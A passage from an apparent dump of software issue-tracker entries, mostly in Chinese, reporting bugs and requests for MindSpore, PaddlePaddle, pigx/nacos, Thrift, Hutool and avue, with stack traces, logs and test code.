0x562e6e3c88e4p 16 0x562e6e3c9e6ap _PyFunction_FastCallDict + 986 17 0x562e6e348b0fp _PyObject_FastCallDict + 623 18 0x562e6e34d6a3p _PyObject_Call_Prepend + 99 19 0x562e6e34854ep PyObject_Call + 62 20 0x562e6e3f5a6cp _PyEval_EvalFrameDefault + 6636 21 0x562e6e3c88e4p 22 0x562e6e3c9771p 23 0x562e6e3cf505p 24 0x562e6e3f5147p _PyEval_EvalFrameDefault + 4295 25 0x562e6e3c88e4p 26 0x562e6e3c9771p 27 0x562e6e3cf505p 28 0x562e6e3f5147p _PyEval_EvalFrameDefault + 4295 29 0x562e6e3ca289p PyEval_EvalCodeEx + 809 30 0x562e6e3cb01cp PyEval_EvalCode + 28 31 0x562e6e44d3c4p 32 0x562e6e44d7c1p PyRun_FileExFlags + 161 33 0x562e6e44d9c3p PyRun_SimpleFileExFlags + 451 34 0x562e6e4514b3p Py_Main + 1555 35 0x562e6e31a02ep main + 238 36 0x7f87d0585495p __libc_start_main + 245 37 0x562e6e3fae0ep"
微服务之间组网策略及其nacos 的网卡选择策略,"pigx版本: 3.1.0 操作系统: windows 是否修改包名: 否 Connection timed out 1.服务器A把所有微服务启动了包括pigx-codegen 2.本地B只启动pigx-codegen（在本地hosts先设置好 服务器A_ip pigx-auth） 3.检查服务监控界面里pigx-codegen微服务已经显示 2 instance，表示微服务启动ok 4.刷新代码生成界面 直到轮询到本地B的pigx-codegen时候界面一直等待，后台B有报错 5.将nacos中token-info-uri的端口配置加上3000重启仍然报错，已确认docker做过了端口 映射，奇怪的是无论是默认的80还是3000端口微服务B后台都会报错。   <code>: java.lang.RuntimeException: org.springframework.web.client.ResourceAccessException: I/O error on POST request for ""http://pigx-auth:3000/oauth/check_token"": Connection timed out: connect; nested exception is java.net.ConnectException: Connection timed out: connect"
多个GPU加速没有预期效果,"问题：在单机上使用多个GPU加速任务，结果速度和单GPU速度差不多。 细节： 使用了1000000的buff和1000的batch_size，5个GPU，结果每个GPU使用率最高只有40%，大部分是20%-30%，而且每次刷新经常有几个是0%。如下图所示，其中6，7，9，10，11是我使用的GPU。内存也没有沾满。   <code>: train_reader = paddle.batch( paddle.reader.shuffle(paddle.reader.buffered( reader.train_reader(train_data_dir, word_dict, l1_dict, lbl_dict), 1000000),buf_size=10000), batch_size=1000) paddle.init(use_gpu=True, trainer_count=5)"
prelu_op compile error,"platform::Transform()不是需要模板参数么？为什么这里调用的时候没加模板参数？ https://github.com/PaddlePaddle/Paddle/blob/develop/paddle/operators/prelu_op.h#L58 error msg:   <code>: error: no instance of overloaded function ""paddle::operators::Transform"" matches the argument list argument types are: (paddle::platform::Place, const float *, const float *, float *, paddle::operators::PReluFunctor&lt;float&gt;) detected during: instantiation of ""void paddle::operators::PReluKernel&lt;Place, T&gt;::Compute(const paddle::framework::ExecutionContext &amp;) const [with Place=paddle::platform::GPUPlace, T=float]"""
"[CT][MS][parallel]embeddinglookup_manual, use case is stuck and process does not exit",": /device gpu : -- MindSpore version :master -- Python version :3.7 -- OS platform and distribution : -- GCC/Compiler version : -- COMMITID(): 442d73b1ac(二分的） test_auto_parallel_embeddinglookup_manual_split_strategy_1x8_1x1_tuple_128 test_auto_parallel_embeddinglookup_manual_split_strategy_2x4_1x2_tuple_6_4 test_auto_parallel_embeddinglookup_manual_split_strategy_8x1_1x8_tuple_13_15_24_3_6_18_20_29 test_semi_auto_parallel_embeddinglookup_manual_split_strategy_1x8_1x1_tuple_128 None 新问题 unknown level1 z00520185 None None None 修改 test_semi_auto_parallel_embeddinglookup_manual_split_strategy_2x4_1x2_tuple_4_4 None 新问题 unknown level0 z00520185 None None None 修改 test_semi_auto_parallel_embeddinglookup_manual_split_strategy_2x4_1x2_tuple_50_78 None 新问题 unknown level1 z00520185 None None None 修改 test_semi_auto_parallel_embeddinglookup_manual_split_strategy_4x2_1x4_tuple_32_70_5_21 None 新问题 unknown level1 z00520185 None None None 修改 test_semi_auto_parallel_embeddinglookup_manual_split_strategy_8x1_1x8_13_15_24_3_6_18_20_29 cd /home/wys/dump/MindSporeTest/parallel/operator ../../share/parallel/tool/pytest_parallel.sh -r /root/mindspore/hccl/hccl_8p.json -s 8 -b 0 -e 7 -f test_parallel_embeddinglookup_manual_split.py -t test_auto_parallel_embeddinglookup_manual_split_strategy_1x8_1x1_tuple_128 embeddinglookup_manual, use case is stuck and process does not exit case pass [INFO] RUNTIME_FRAMEWORK(80240,7f81b37fe700,python):2021-07-01-09:23:28.275.060 [mindspore/ccsrc/runtime/framework/actor/loop_count_actor.cc:114] IncreaseLoopCount] Loop count actor(kernel_graph_8_9_10_11_12_LoopCountActor) running, loop count: 1, current count: 1, total running count: 1 [INFO] RUNTIME_FRAMEWORK(80238,7f5eabfff700,python):2021-07-01-09:23:28.275.142 [mindspore/ccsrc/runtime/framework/actor/loop_count_actor.cc:114] IncreaseLoopCount] Loop count actor(kernel_graph_8_9_10_11_12_LoopCountActor) running, loop count: 1, current count: 1, total running count: 1 [INFO] VM(80240,7f8431298740,python):2021-07-01-09:23:28.275.157 [mindspore/ccsrc/vm/backend.cc:632] RunGraph] Run actor end, actor name: kernel_graph_8_9_10_11_12 [INFO] VM(80238,7f6128f89740,python):2021-07-01-09:23:28.275.232 [mindspore/ccsrc/vm/backend.cc:632] RunGraph] Run actor end, actor name: kernel_graph_8_9_10_11_12 [INFO] RUNTIME_FRAMEWORK(80237,7f7bb17fe700,python):2021-07-01-09:23:28.275.274 [mindspore/ccsrc/runtime/framework/actor/loop_count_actor.cc:114] IncreaseLoopCount] Loop count actor(kernel_graph_8_9_10_11_12_LoopCountActor) running, loop count: 1, current count: 1, total running count: 1 [INFO] RUNTIME_FRAMEWORK(80242,7fda80b10700,python):2021-07-01-09:23:28.275.275 [mindspore/ccsrc/runtime/framework/actor/loop_count_actor.cc:114] IncreaseLoopCount] Loop count actor(kernel_graph_8_9_10_11_12_LoopCountActor) running, loop count: 1, current count: 1, total running count: 1 [INFO] RUNTIME_FRAMEWORK(80239,7fd7527fc700,python):2021-07-01-09:23:28.275.308 [mindspore/ccsrc/runtime/framework/actor/loop_count_actor.cc:114] IncreaseLoopCount] Loop count actor(kernel_graph_8_9_10_11_12_LoopCountActor) running, loop count: 1, current count: 1, total running count: 1 [INFO] VM(80237,7f7d7b2b1740,python):2021-07-01-09:23:28.275.357 [mindspore/ccsrc/vm/backend.cc:632] RunGraph] Run actor end, actor name: kernel_graph_8_9_10_11_12 [INFO] VM(80242,7fdc43b57740,python):2021-07-01-09:23:28.275.397 [mindspore/ccsrc/vm/backend.cc:632] RunGraph] Run actor end, actor name: kernel_graph_8_9_10_11_12 [INFO] VM(80239,7fd9d2819740,python):2021-07-01-09:23:28.275.415 [mindspore/ccsrc/vm/backend.cc:632] RunGraph] Run actor end, actor name: kernel_graph_8_9_10_11_12 [INFO] RUNTIME_FRAMEWORK(80243,7f39e3fff700,python):2021-07-01-09:23:28.275.463 [mindspore/ccsrc/runtime/framework/actor/loop_count_actor.cc:114] IncreaseLoopCount] Loop count actor(kernel_graph_8_9_10_11_12_LoopCountActor) running, loop count: 1, current count: 1, total running count: 1 [INFO] VM(80243,7f3c6674b740,python):2021-07-01-09:23:28.275.589 [mindspore/ccsrc/vm/backend.cc:632] RunGraph] Run actor end, actor name: kernel_graph_8_9_10_11_12 [INFO] RUNTIME_FRAMEWORK(80236,7f2651fff700,python):2021-07-01-09:23:28.275.603 [mindspore/ccsrc/runtime/framework/actor/loop_count_actor.cc:114] IncreaseLoopCount] Loop count actor(kernel_graph_8_9_10_11_12_LoopCountActor) running, loop count: 1, current count: 1, total running count: 1 [INFO] PIPELINE(80241,7fb1f2cd1740,python):2021-07-01-09:23:28.275.640 [mindspore/ccsrc/pipeline/jit/pipeline.cc:993] Run] VM loop size 1, loopsink size 1 [INFO] PIPELINE(80241,7fb1f2cd1740,python):2021-07-01-09:23:28.275.651 [mindspore/ccsrc/pipeline/jit/action.cc:84] operator()] Execute args size 12 [INFO] VM(80241,7fb1f2cd1740,python):2021-07-01-09:23:28.275.656 [mindspore/ccsrc/vm/backend.cc:550] RunGraph] Run actor begin, actor name: kernel_graph_8_9_10_11_12 [INFO] RUNTIME_FRAMEWORK(80241,7faf707fc700,python):2021-07-01-09:23:28.275.750 [mindspore/ccsrc/runtime/framework/actor/data_source_actor.cc:39] FetchData] Data source actor(kernel_graph_8_9_10_11_12_HostDSActor) fetches data. [INFO] PIPELINE(80240,7f8431298740,python):2021-07-01-09:23:28.275.782 [mindspore/ccsrc/pipeline/jit/pipeline.cc:993] Run] VM loop size 1, loopsink size 1 [INFO] PIPELINE(80240,7f8431298740,python):2021-07-01-09:23:28.275.792 [mindspore/ccsrc/pipeline/jit/action.cc:84] operator()] Execute args size 12 [INFO] VM(80240,7f8431298740,python):2021-07-01-09:23:28.275.798 [mindspore/ccsrc/vm/backend.cc:550] RunGraph] Run actor begin, actor name: kernel_graph_8_9_10_11_12 [INFO] VM(80236,7f2830b8f740,python):2021-07-01-09:23:28.275.833 [mindspore/ccsrc/vm/backend.cc:632] RunGraph] Run actor end, actor name: kernel_graph_8_9_10_11_12 [INFO] PIPELINE(80238,7f6128f89740,python):2021-07-01-09:23:28.275.857 [mindspore/ccsrc/pipeline/jit/pipeline.cc:993] Run] VM loop size 1, loopsink size 1 [INFO] PIPELINE(80238,7f6128f89740,python):2021-07-01-09:23:28.275.868 [mindspore/ccsrc/pipeline/jit/action.cc:84] operator()] Execute args size 12 [INFO] VM(80238,7f6128f89740,python):2021-07-01-09:23:28.275.873 [mindspore/ccsrc/vm/backend.cc:550] RunGraph] Run actor begin, actor name: kernel_graph_8_9_10_11_12 [INFO] RUNTIME_FRAMEWORK(80240,7f81b3fff700,python):2021-07-01-09:23:28.275.884 [mindspore/ccsrc/runtime/framework/actor/data_source_actor.cc:39] FetchData] Data source actor(kernel_graph_8_9_10_11_12_HostDSActor) fetches data. [INFO] RUNTIME_FRAMEWORK(80238,7f5f4d7fe700,python):2021-07-01-09:23:28.275.952 [mindspore/ccsrc/runtime/framework/actor/data_source_actor.cc:39] FetchData] Data source actor(kernel_graph_8_9_10_11_12_HostDSActor) fetches data. [INFO] PIPELINE(80237,7f7d7b2b1740,python):2021-07-01-09:23:28.276.020 [mindspore/ccsrc/pipeline/jit/pipeline.cc:993] Run] VM loop size 1, loopsink size 1 [INFO] PIPELINE(80237,7f7d7b2b1740,python):2021-07-01-09:23:28.276.035 [mindspore/ccsrc/pipeline/jit/action.cc:84] operator()] Execute args size 12 [INFO] VM(80237,7f7d7b2b1740,python):2021-07-01-09:23:28.276.040 [mindspore/ccsrc/vm/backend.cc:550] RunGraph] Run actor begin, actor name: kernel_graph_8_9_10_11_12 [INFO] RUNTIME_FRAMEWORK(80237,7f7bb0ffd700,python):2021-07-01-09:23:28.276.126 [mindspore/ccsrc/runtime/framework/actor/data_source_actor.cc:39] FetchData] Data source actor(kernel_graph_8_9_10_11_12_HostDSActor) fetches data. [INFO] PIPELINE(80242,7fdc43b57740,python):2021-07-01-09:23:28.276.380 [mindspore/ccsrc/pipeline/jit/pipeline.cc:993] Run] VM loop size 1, loopsink size 1 [INFO] PIPELINE(80242,7fdc43b57740,python):2021-07-01-09:23:28.276.401 [mindspore/ccsrc/pipeline/jit/action.cc:84] operator()] Execute args size 12 [INFO] VM(80242,7fdc43b57740,python):2021-07-01-09:23:28.276.410 [mindspore/ccsrc/vm/backend.cc:550] RunGraph] Run actor begin, actor name: kernel_graph_8_9_10_11_12 [INFO] PIPELINE(80239,7fd9d2819740,python):2021-07-01-09:23:28.276.482 [mindspore/ccsrc/pipeline/jit/pipeline.cc:993] Run] VM loop size 1, loopsink size 1 [INFO] PIPELINE(80239,7fd9d2819740,python):2021-07-01-09:23:28.276.509 [mindspore/ccsrc/pipeline/jit/action.cc:84] operator()] Execute args size 12 [INFO] VM(80239,7fd9d2819740,python):2021-07-01-09:23:28.276.520 [mindspore/ccsrc/vm/backend.cc:550] RunGraph] Run actor begin, actor name: kernel_graph_8_9_10_11_12 [INFO] RUNTIME_FRAMEWORK(80242,7fd9c17fe700,python):2021-07-01-09:23:28.276.528 [mindspore/ccsrc/runtime/framework/actor/data_source_actor.cc:39] FetchData] Data source actor(kernel_graph_8_9_10_11_12_HostDSActor) fetches data. [INFO] RUNTIME_FRAMEWORK(80239,7fd752ffd700,python):2021-07-01-09:23:28.276.646 [mindspore/ccsrc/runtime/framework/actor/data_source_actor.cc:39] FetchData] Data source actor(kernel_graph_8_9_10_11_12_HostDSActor) fetches data. [INFO] PIPELINE(80243,7f3c6674b740,python):2021-07-01-09:23:28.277.296 [mindspore/ccsrc/pipeline/jit/pipeline.cc:993] Run] VM loop size 1, loopsink size 1 [INFO] PIPELINE(80243,7f3c6674b740,python):2021-07-01-09:23:28.277.327 [mindspore/ccsrc/pipeline/jit/action.cc:84] operator()] Execute args size 12 [INFO] VM(80243,7f3c6674b740,python):2021-07-01-09:23:28.277.341 [mindspore/ccsrc/vm/backend.cc:550] RunGraph] Run actor begin, actor name: kernel_graph_8_9_10_11_12 [INFO] RUNTIME_FRAMEWORK(80243,7f3aa17fe700,python):2021-07-01-09:23:28.277.517 [mindspore/ccsrc/runtime/framework/actor/data_source_actor.cc:39] FetchData] Data source actor(kernel_graph_8_9_10_11_12_HostDSActor) fetches data. [INFO] PIPELINE(80236,7f2830b8f740,python):2021-07-01-09:23:28.280.131 [mindspore/ccsrc/pipeline/jit/pipeline.cc:993] Run] VM loop size 1, loopsink size 1 [INFO] PIPELINE(80236,7f2830b8f740,python):2021-07-01-09:23:28.280.165 [mindspore/ccsrc/pipeline/jit/action.cc:84] operator()] Execute args size 12 [INFO] VM(80236,7f2830b8f740,python):2021-07-01-09:23:28.280.178 [mindspore/ccsrc/vm/backend.cc:550] RunGraph] Run actor begin, actor name: kernel_graph_8_9_10_11_12 [INFO] RUNTIME_FRAMEWORK(80236,7f26599b1700,python):2021-07-01-09:23:28.280.837 [mindspore/ccsrc/runtime/framework/actor/data_source_actor.cc:39] FetchData] Data source actor(kernel_graph_8_9_10_11_12_HostDSActor) fetches data. The user-provided time limit for job execution has been reached: Timeout: 600 seconds The job will now be aborted. Please check your code and/or adjust/remove the job execution time limit (as specified by --timeout command line option or MPIEXEC_TIMEOUT environment variable).   <code>: """""" TEST_SUMMARY: test operator embeddinglookup in auto parallel mode with 8p, divide by field, setting strategy ((1, 8), (1, 1)) input shape is ((128,128),(128,8)), split_info_tuple is (128,) """""" def test_auto_parallel_embeddinglookup_manual_split_strategy_1x8_1x1_tuple_128(): np.random.seed(1) a0 = np.random.randint(2, 16, size=(128, 1)) a1 = np.random.randint(16, 32, size=(128, 1)) a2 = np.random.randint(35, 65, size=(128, 1)) a3 = np.random.randint(67, 89, size=(128, 1)) a3[a3 == 70] = 86 a4 = np.random.randint(99, 108, size=(128, 1)) a4[a4 == 100] = 101 a5 = np.random.randint(108, 110, size=(128, 1)) a6 = np.random.randint(111, 117, size=(128, 1)) a7 = np.random.randint(120, 128, size=(128, 1)) img = np.concatenate((a0, a1, a2, a3, a4, a5, a6, a7), axis=1) standalone_dataset = RecommendFakeData( img=img, size=256, batch_size=128, image_size=(8,), num_classes=1024 ) standalone_dataset.set_image_data_type(np.int32) fact = ParallelEmbeddingLookupManualSplitFactory( param_size=(128, 128), mul_size=(128, 1024) ) fact.mindspore_standalone_impl(dataset=standalone_dataset, epoch=2) output_alone = fact.mindspore_standalone_eval(standalone_dataset) parallel_dataset = RecommendFakeData( img=img, size=256, batch_size=16, image_size=(8,), use_parallel=True, num_classes=1024, ) parallel_dataset.set_image_data_type(np.int32) fact.mindspore_auto_parallel_impl( dataset=parallel_dataset, epoch=2, device_num=8, strategy=((1, 8), (1, 1)), split_info_tuple=(128,), ) output_parallel = fact.mindspore_auto_parallel_eval( standalone_dataset, full_batch=True ) fact.mindspore_eval_result_cmp(output_alone, output_parallel)"
"spring boot2 服务端使用xml配置，serverType=""HTRIFT""会报错，使用NETTY可以正常运行",请问什么原因啊   <code>: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'billApiServiceServer': Invocation of init method failed; nested exception is java.lang.IllegalArgumentException: argument type mismatch at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1786) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:602) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:925) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:917) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:582) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:767) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:759) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:426) at org.springframework.boot.SpringApplication.run(SpringApplication.java:326) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1311) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1300) at com.hqsc.billapi.api.ApiApplication.main(ApiApplication.java:12) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.boot.devtools.restart.RestartLauncher.run(RestartLauncher.java:49) Caused by: java.lang.IllegalArgumentException: argument type mismatch at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:423) at server.config.AbstractKoalsServerPublisher.getTProcessor(AbstractKoalsServerPublisher.java:184) at thrift.ThriftServer.run(ThriftServer.java:48) at server.KoalasServerPublisher.afterPropertiesSet(KoalasServerPublisher.java:52) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1845) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1782) ... 21 common frames omitted Process finished with exit code 0
Add prefetch method to PaddleAPI's GradientMachine.,"There is not method in class GradientMachine defined in PaddleAPI.h However, we need to add this method, which related to #364:Path errors when running `make test`. In particular, we need to use it with sparse_udpate and sparse_remote_update. When used with , is supposed to be invoked before /. through SWIG cannot be performed without . Also should be added to the monkey patch method when is enabled. The whole architecture of multi-language support is described by issue #258:Support Bilinear interpolation .   <code>: prefetch sparse update prefetch forward backward sparse_update prefetch prefetch forwardTest sparse update"
[ST][MS/modelzoo][NET][pix2pix][GPU] some wrong in run_train.sh,按照run_train.sh的提示使用命令： bash run_train.sh --device_target GPU --device_id 0 根本无法训练 / 硬件环境: /device GPU/ : -- MindSpore version :master commit_id:4d1f8c24 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_pix2pix_facede_map_gpu_train_and_loss_8p_0002 get code from models sh run_train.sh 训练正常 走给王泽阳一(WZ)   <code>: bash run_train.sh --device_target GPU --device_id 0 ===================================================================================================================== Run this script as: bash run_train.sh [device_target] [device_id] for example: bash run_train.sh --device_target GPU --device_id 0 ===================================================================================================================== Usage: bash run_train.sh [DEVICE_TARGET] [DEVICE_ID]
"BeanUtil.copyProperties(source, obj, CopyOptions.create().ignoreNullValue());","public class UserSource { private Long id; private String name; private Integer age; private Date createTime; } public class UserBaseInfo { } BeanUtil.copyProperties(source, obj, CopyOptions.create().ignoreNullValue()); UserBaseInfo 为null的属性没有被忽略，依然覆盖有值的属性   <code>: private UserBaseInfo userBaseInfo; private String nickName; private String realName;"
sdk里面InstanceType.h里面的结构体MultipleTypesInstance不需要slotTypes字段了？,Check out this page to find out much more about markdown.   <code>: how do you run your code? what system do you use? Are you using GPU or not?
jbc2mpl: generates code with mismatching types which caused failure when run,"jbc2mpl generated code with mismatching type which causes failure when code is executed. Test.java public class Test { } Type mismatch generated by jbc2mpl in Test.mpl 213 #LINE Test.java : 19, INSTIDX : 12||000c: iadd 214 dassign %Reg1_I 0 (add i32 (dread i8 %Reg1_B, dread i32 %Reg2_I)) &lt;----- type mismatch between add i32 and dread i8.   <code>: private byte byteVar; public static void main(String[] args) { Test test = new Test(); test.nestedByteVar(); System.out.println(test.byteVar); } void nestedByteVar() { byteVar = 1; Nested nested = new Nested(); nested.incByte(); } class Nested { void incByte() { byteVar += 1; } }"
"ValueError: Please input the correct checkpoint file name. ""Mindspore""","bug/mindspore-assistant device gpu -- MindSpore version (1.3) -- Python version (python 3.7.5) -- OS platform and distribution (ubuntu 18.04) -- GCC/Compiler version (7.3.0) -- GPU, cuda 11.1 I am working on implementing Faster-RCNN using Mindspore, I run the training script successfully, and the code create 20 checkpoints with .ckpt and one file with .meta extension. I am using the code from the official gitee as a reference: https://gitee.com/mindspore/mindspore/tree/r1.3 When I run the evaluation script I get the following Error: ValueError: Please input the correct checkpoint file name. From the serialization.py script. Here is how I define my checkpoints folder which contains the 20 ckpt files and the .meta file: following is the function to load the checkpoint file: This is the line Causing the error (Calling the upper function to load the the checkpoint): Why its showing this error although I put the right checkpoint folder?? How to handle multiple checkpoints files? Does expect only one? Note: I encounter the same issue when I try to run the “convert_checkpoint.py” script.   <code>: raise ValueError(""Please input the correct checkpoint file name."") checkpoint_path: ""/home/openuae/PycharmProjects/pythonProject/faster_rcnn/Check_point/ckpt_0"" def fasterrcnn_eval(dataset_path, ckpt_path, ann_file): """"""FasterRcnn evaluation."""""" ds = create_fasterrcnn_dataset(config, dataset_path, batch_size=config.test_batch_size, is_training=False) net = Faster_Rcnn_Resnet(config) param_dict = load_checkpoint(ckpt_path) fasterrcnn_eval(mindrecord_file, config.checkpoint_path, config.ann_file)"
fix travis check style for Go,"Go pre-commit hook does not modify code, so will have 0 exit code in that case.   <code>: git diff --exit-code"
【众智】【数据算子】LowpassBiquad,1 功能介绍 1.1 算子分析   <code>: 双二阶低通滤波器（biquad lowpass filter）常用于对音频数据施以低通滤波，使输入音频信号中低于截止频率的部分几乎不受衰减地通过，而高于截止频率的部分受到极大地衰减。 低通滤波器：例如，一个固体屏障就是一个声波的低通滤波器。当另外一个房间中播放音乐时，很容易听到音乐的低音，但是高音部分大部分被过滤掉了。类似的情况是一辆小汽车中播放非常大的音乐声，在另外一个车中的人听来却是低音节拍，因为这时封闭的汽车和空气间隔起到了低通滤波器的作用，减弱了所有的高音。有时被称为高频剪切滤波器，或高音消除滤波器。 二阶滤波器对于削减高频信号能起到更高的效果，相比于一阶滤波器，它的滚降速率更快。例如，一个二阶的巴特沃斯滤波器（它是一个没有尖峰的临界衰减RLC电路）频率增加一倍时就将信号强度衰减到最初的四分之一（每倍频-12dB）。其它的二阶滤波器最初的滚降速度可能依赖于它们的Q因数，但是最后的速度都是每倍频 -12dB。 其中一共包含三个参数，采样率sample_rate，定义了每秒从连续信号中提取并组成离散信号的采样个数，它用赫兹（Hz）来表示；截止频率cutoff_freq；以及Q因子：Q，它定义了截止频率所在半功率点的位置，默认值为0.707(3dB)。 双二阶滤波器的传输函数如下：
[ST][MS][Data]编译阶段杀死yolov3_darknet53一个数据处理进程后，训练进程无法正常退出,"编译阶段杀死yolov3_darknet53一个数据处理进程后，训练进程无法正常退出 / 硬件环境: /device ascend等其他芯片 : -- MindSpore version :commit_id = ''[sha1]:59ac7e37,[branch]:(HEAD,origin/r1.8,r1.8)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_yolov3_process_kill15_one_dataprocess_0001.py cd solution_test/cases/03subject_test/00reliability_availability/01fault_injection/01business_fault/02process/00process_exit/ pytest -s test_ms_yolov3_process_kill15_one_dataprocess_0001.py 训练进程正常退出 责任人 骆阳   <code>: Process 181013: python train.py --data_dir=/home/workspace/mindspore_dataset//coco2014/ --pretrained_backbone=/home/workspace/mindspore_ckpt/yolov3_pretrained_backbone/0-148_92000.ckpt --is_distributed=0 --lr=0.001 --loss_scale=1024 --weight_decay=0.016 --T_max=320 --max_epoch=320 --warmup_epochs=4 --lr_scheduler=cosine_annealing Python v3.7.6 (/home/miniconda3/envs/ci/bin/python) Thread 0xFFFF986A8480 (active+gil): ""MainThread"" compile (mindspore/common/api.py:1078) compile (mindspore/nn/cell.py:930) compile_and_run (mindspore/nn/cell.py:957) __call__ (mindspore/nn/cell.py:574) run_train (train.py:171) wrapped_func (model_utils/moxing_adapter.py:168) &lt;module&gt; (train.py:207) Thread 0xFFFECB7FE1E0 (active): ""Thread-1"" poll (multiprocessing/popen_fork.py:28) exitcode (multiprocessing/process.py:223) _monitor_subprocess_exit (mindspore/dataset/engine/datasets.py:3022) _watch_dog (mindspore/dataset/engine/datasets.py:2971) run (threading.py:870) _bootstrap_inner (threading.py:926) _bootstrap (threading.py:890) Thread 0xFFFEC8FF91E0 (idle): ""QueueFeederThread"" wait (threading.py:296) _feed (multiprocessing/queues.py:224) run (threading.py:870) _bootstrap_inner (threading.py:926) _bootstrap (threading.py:890) Thread 0xFFFE7E4311E0 (idle): ""QueueFeederThread"" wait (threading.py:296) _feed (multiprocessing/queues.py:224) run (threading.py:870) _bootstrap_inner (threading.py:926) _bootstrap (threading.py:890)"
【众智】【计算-AICPU接入】NonMaxSuppressionV3,AICPU算子接入 接口目录：mindspore/ops/operations/image_ops.py boxes scores max_output_size Number/Tensor iou_threshold Number/Tensor score_threshold Number/Tensor selected_indices 对应底层算子 对应底层AICPU算子NonMaxSuppressionV3：   <code>: class NonMaxSuppression(Primitive):
v2.10.5 安装时的警告: ?WARN? Issues with peer dependencies found,"案发现场 安装依赖时的警告日志: (我用的 pnpm) 建议更改 不建议锁定 peerDependencies 到固定版本, 确保兼容的情况下版本号应尽量宽泛 Trying to install another plugin with a conflicting requirement may cause an error if the tree cannot be resolved correctly. For this reason, make sure your plugin requirement is as broad as possible, and not to lock it down to specific patch versions. -- https://docs.npmjs.com/cli/v9/configuring-npm/package-json#peerdependencies 本来不想麻烦你们 我自己提 PR 的, 结果发现好像创建不了   <code>: WARN Issues with peer dependencies found . └─┬ @smallwei/avue 2.10.5 ├── ? unmet peer axios@^0.21.1: found 1.2.0 └── ? unmet peer vue@2.7.10: found 2.7.14 ""peerDependencies"": { ""axios"": ""*"", ""element-ui"": ""^2.15.10"", ""vue"": ""^2.7.x"" },"
"Three operators, such as bcewithlogitsloss, have precision problems.",": /device gpu + graph模式 : -- MindSpore version :1.3.0 -- Python version :Python 3.7.5 -- OS platform and distribution :Linux euleros2u3-cbg 3.10.0-514.44.5.10.h254.x86_64 -- GCC/Compiler version : pytest -s test_bcewithlogitsloss.py pytest -s test_sampledsoftmaxloss.py pytest -s test_uniformcandidatesampler.py bcewithlogitsloss等3个算子出现精度问题 test pass   <code>: def test_bcewithlogitsloss_input_1d(): fact = BCEWithLogitsLossFactory(input_shape=(5,), weight_shape=(1,), pos_weight_shape=(5,), reduction='sum', dtype=np.float16) fact.loss = 5e-3 &gt; fact.forward_cmp() ../operations/test_bcewithlogitsloss.py:46: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/nn/bcewithlogitsloss_ops.py:88: in forward_cmp allclose_nparray(out_pytorch, out_mindspore, self.loss, self.loss) ../share/utils.py:30: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array(1.496, dtype=float16) data_me = array(0.1841, dtype=float16), rtol = 0.005, atol = 0.005 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[1.496] E data_me_error:[0.1841] E loss:[1.3125] def test_sampledsoftmaxloss_dtype_fp16(): fact = SampledSoftmaxLossFactory(input_shape=(3, 10), num_sampled=4, num_classes=7, dtype=np.float16) &gt; fact.forward_cmp() ../operations/test_sampledsoftmaxloss.py:148: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/nn/sampledsoftmaxlosss_ops.py:77: in forward_cmp allclose_nparray(out_ms1, out_ms2, self.loss, self.loss) ../share/utils.py:30: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = 